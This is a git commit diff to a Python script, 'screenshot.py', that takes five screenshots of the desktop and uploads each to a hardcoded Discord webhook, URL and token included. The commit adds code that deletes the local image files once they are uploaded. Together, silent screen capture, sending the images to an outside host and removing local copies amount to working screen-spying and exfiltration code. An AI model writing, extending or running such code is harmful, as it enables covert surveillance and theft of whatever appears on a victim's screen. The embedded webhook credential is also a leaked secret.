1dac37597eba94f9074d180be63fa51f8bba5f97
kaki869 <thexor7@gmail.com>
2025-11-02 22:55:06 +0000

    Update screenshot.py

--- screenshot.py
+++ screenshot.py
@@ -1,6 +1,7 @@
 import pyautogui
 import time
 import requests
+import os
 
 def take_screenshot(filename='screenshot.png'):
     screenshot = pyautogui.screenshot()
@@ -16,7 +17,12 @@ def send_to_discord_webhook(webhook_url, file_path):
 if __name__ == "__main__":
     webhook_url = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'
 
+    screenshot_paths = []
     for i in range(5):
         screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
+        screenshot_paths.append(screenshot_path)
         send_to_discord_webhook(webhook_url, screenshot_path)
         time.sleep(0.5)
+
+    for path in screenshot_paths:
+        os.remove(path)
